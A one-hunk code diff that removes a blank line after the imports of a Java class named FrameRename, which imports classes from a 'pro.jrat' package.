@@ -18,7 +18,6 @@ import pro.jrat.Slave;
 import pro.jrat.settings.ServerID;
 import pro.jrat.utils.Utils;
 
-
 @SuppressWarnings("serial")
 public class FrameRename extends BaseFrame {
 
